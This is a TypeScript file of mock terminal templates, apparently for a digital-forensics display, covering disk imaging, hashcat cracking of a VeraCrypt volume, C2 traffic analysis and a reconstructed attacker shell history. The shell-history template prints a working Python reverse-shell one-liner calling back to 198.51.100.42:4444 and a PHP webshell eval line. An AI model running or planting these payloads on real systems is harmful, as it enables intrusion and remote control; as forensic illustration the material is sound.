import type { TerminalDocument, TerminalBlock } from '@/types/evidence/terminal';
import { nextTerminalBlockId } from '@/types/evidence/terminal';

type TerminalTemplateName = 'disk_imaging' | 'decryption_session' | 'network_capture' | 'shell_history';

function b(type: TerminalBlock['type'], props: TerminalBlock['props'], span = 12): TerminalBlock {
  return { id: nextTerminalBlockId(type.slice(0, 3)), type, props, span, style: {} } as TerminalBlock;
}

export const diskImaging = (): TerminalDocument => ({
  v: 1,
  theme: 'terminal',
  blocks: [
    b('status_banner', { text: 'DISK IMAGING SESSION', tone: 'info', caption: 'Case: CR-2024-008912' }),
    b('prompt_line', { prompt: 'root@forensic-workstation:~#', command: 'lsblk -f', output: ['NAME      FSTYPE      LABEL    MOUNTPOINT', 'sda       ext4        OS       /', 'sdb       ntfs        EVIDENCE (not mounted)'] }),
    b('prompt_line', { prompt: 'root@forensic-workstation:~#', command: 'dd if=/dev/sdb of=/evidence/disk_image.dd bs=64K conv=sync,noerror status=progress', output: ['1258291200 bytes (1.3 GB, 1.2 GiB) copied, 42.3 s, 29.7 MB/s', '20480+0 records in', '20480+0 records out', '1073741824 bytes (1.1 GB, 1.0 GiB) copied, 45.1 s, 23.8 MB/s'] }),
    b('status_banner', { text: 'HASH VERIFICATION', tone: 'ok', caption: 'SHA-256 match confirmed' }),
    b('hash_matrix', { algorithm: 'sha256', rows: [
      { offset: '00000000', bytes: ['e3', 'b0', 'c4', '42', '98', 'fc', '1c', '14', '9a', 'fb', 'f4', 'c8', '99', '6f', 'b9', '24'], ascii: '................' },
      { offset: '00000010', bytes: ['27', 'ae', '41', 'e4', '64', '9b', '93', '4c', 'a4', '95', '99', '1b', '78', '52', 'b8', '55'], ascii: "'..d...L...xR.U" },
    ]}),
    b('prompt_line', { prompt: 'root@forensic-workstation:~#', command: 'sha256sum /evidence/disk_image.dd', output: ['e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /evidence/disk_image.dd'] }),
    b('file_tree', { entries: [
      { path: '/evidence/disk_image.dd', size: '1.0 GB', kind: 'file', state: 'intact' },
      { path: '/evidence/disk_image.dd.log', size: '4.2 KB', kind: 'file', state: 'intact' },
    ]}),
  ],
});

export const decryptionSession = (): TerminalDocument => ({
  v: 1,
  theme: 'terminal',
  blocks: [
    b('status_banner', { text: 'DECRYPTION SESSION', tone: 'warn', caption: 'Target: suspect_laptop_veracrypt.hc' }),
    b('prompt_line', { prompt: 'analyst@decrypt:~$', command: 'veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt', output: ['Enter password for /evidence/suspect_laptop_veracrypt.hc:', '***', 'Incorrect password.'] }),
    b('encryption_flow', { algorithm: 'aes', direction: 'v', steps: [] }),
    b('prompt_line', { prompt: 'analyst@decrypt:~$', command: 'hashcat -m 13721 /evidence/suspect_laptop_veracrypt.hc /wordlists/rockyou.txt -r /rules/best64.rule', output: ['hashcat (v6.2.6) starting...', 'Dictionary cache hit: rockyou.txt', 'Progress: 12.3% (1452341/11818768)', 'STATUS: CRACKED', 'Password: Winter2024!'] }),
    b('status_banner', { text: 'PASSWORD RECOVERED', tone: 'ok', caption: 'Winter2024!' }),
    b('prompt_line', { prompt: 'analyst@decrypt:~$', command: 'veracrypt --text --mount /evidence/suspect_laptop_veracrypt.hc /mnt/decrypt --password=Winter2024!', output: ['Volume mounted successfully at /mnt/decrypt'] }),
    b('file_tree', { entries: [
      { path: '/mnt/decrypt/financial_records.xlsx', size: '2.4 MB', kind: 'file', state: 'intact' },
      { path: '/mnt/decrypt/encrypted_comms/', kind: 'dir' },
      { path: '/mnt/decrypt/encrypted_comms/signal_export.txt', size: '892 KB', kind: 'file', state: 'intact' },
      { path: '/mnt/decrypt/deleted_recovery/', kind: 'dir' },
      { path: '/mnt/decrypt/deleted_recovery/recovered_photos/', kind: 'dir' },
    ]}),
  ],
});

export const networkCapture = (): TerminalDocument => ({
  v: 1,
  theme: 'terminal',
  blocks: [
    b('status_banner', { text: 'NETWORK CAPTURE ANALYSIS', tone: 'info', caption: 'PCAP: traffic_capture_20240315.pcapng' }),
    b('prompt_line', { prompt: 'analyst@netforensics:~$', command: 'tshark -r traffic_capture_20240315.pcapng -Y "tcp.port == 443" -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport', output: ['2024-03-15 14:22:13.123  192.168.1.45  203.0.113.12  54321  443', '2024-03-15 14:22:13.145  203.0.113.12  192.168.1.45  443  54321', '2024-03-15 14:22:13.167  192.168.1.45  203.0.113.12  54321  443'] }),
    b('packet_trace', { rows: [
      { src: '192.168.1.45:54321', dst: '203.0.113.12:443', proto: 'TCP', bytes: '78', state: 'SYN_SENT' },
      { src: '203.0.113.12:443', dst: '192.168.1.45:54321', proto: 'TCP', bytes: '74', state: 'SYN_RECEIVED' },
      { src: '192.168.1.45:54321', dst: '203.0.113.12:443', proto: 'TCP', bytes: '66', state: 'ESTABLISHED' },
      { src: '192.168.1.45:54321', dst: '203.0.113.12:443', proto: 'TLS', bytes: '517', state: 'CLIENT_HELLO' },
      { src: '203.0.113.12:443', dst: '192.168.1.45:54321', proto: 'TLS', bytes: '1460', state: 'SERVER_HELLO' },
    ]}),
    b('prompt_line', { prompt: 'analyst@netforensics:~$', command: 'tshark -r traffic_capture_20240315.pcapng -Y "dns" -T fields -e dns.qry.name -e dns.a', output: ['malicious-c2.example.com  198.51.100.42', 'updates.legit-service.com  203.0.113.12'] }),
    b('status_banner', { text: 'SUSPICIOUS C2 DETECTED', tone: 'critical', caption: 'malicious-c2.example.com resolves to 198.51.100.42' }),
    b('ascii_panel', { frame: 'box', caption: 'C2 Communication Flow', lines: [
      '  [Victim]                                 [C2 Server]',
      '      |                                       |',
      '      |--- DNS Query: malicious-c2.example.com --->|',
      '      |<-- DNS Response: 198.51.100.42 -----------|',
      '      |                                       |',
      '      |=== TLS Handshake =======================>|',
      '      |<=== Encrypted Beacon ===================|',
      '      |                                       |',
    ]}),
  ],
});

export const shellHistory = (): TerminalDocument => ({
  v: 1,
  theme: 'terminal',
  blocks: [
    b('status_banner', { text: 'SHELL HISTORY RECONSTRUCTION', tone: 'info', caption: 'Source: /home/suspect/.bash_history (recovered)' }),
    b('output_stream', { label: 'RECONSTRUCTED SESSION', tone: 'info', lines: [
      'suspect@target:~$ cd /var/www/html',
      'suspect@target:/var/www/html$ ls -la',
      'total 48',
      'drwxr-xr-x  3 www-data www-data  4096 Mar 10 09:15 .',
      'drwxr-xr-x  3 root     root      4096 Mar  1 12:00 ..',
      '-rw-r--r--  1 www-data www-data 12342 Mar 10 09:15 index.php',
      'suspect@target:/var/www/html$ cat index.php | grep -n eval',
      '42:  eval(base64_decode($_POST["payload"]));',
      'suspect@target:/var/www/html$ whoami',
      'www-data',
      'suspect@target:/var/www/html$ id',
      'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'suspect@target:/var/www/html$ python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'198.51.100.42\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
    ]}),
    b('status_banner', { text: 'REVERSE SHELL DETECTED', tone: 'critical', caption: 'Callback to 198.51.100.42:4444' }),
    b('ascii_panel', { frame: 'heavy', caption: 'Attack Timeline', lines: [
      'Mar 10 09:15:22  Webshell uploaded via vulnerable upload.php',
      'Mar 10 09:15:45  Attacker enumerates web directory',
      'Mar 10 09:16:12  Webshell executes: eval(base64_decode(...))',
      'Mar 10 09:16:30  Reverse shell spawned to C2',
      'Mar 10 09:17:05  Attacker gains www-data shell',
      'Mar 10 09:18:22  Lateral movement attempted',
    ]}),
  ],
});

export const templates: Record<TerminalTemplateName, () => TerminalDocument> = {
  disk_imaging: diskImaging,
  decryption_session: decryptionSession,
  network_capture: networkCapture,
  shell_history: shellHistory,
};

export type { TerminalTemplateName };